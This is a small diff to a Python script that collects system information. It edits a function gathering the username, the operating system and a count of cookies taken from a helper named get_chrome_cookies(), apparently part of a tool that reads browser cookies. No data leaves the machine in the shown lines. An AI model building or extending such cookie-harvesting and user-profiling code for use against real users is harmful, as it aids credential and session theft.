@@ -43,12 +43,17 @@ def get_chrome_cookies():
 
 # Function to get user information (for example, you can get the username)
 def get_user_info():
-    user_info = {
-        "username": os.getlogin(),
-        "platform": platform.system(),
-        "cookies": len(get_chrome_cookies()) if get_chrome_cookies() else 0
-    }
-    return user_info
+    try:
+        username = os.getenv('USER', 'Unknown User')  # Use environment variable for username
+        user_info = {
+            "username": username,
+            "platform": platform.system(),
+            "cookies": len(get_chrome_cookies()) if get_chrome_cookies() else 0
+        }
+        return user_info
+    except Exception as e:
+        print(f"Error getting user info: {e}")
+        return None
 
 # Main function
 def main():
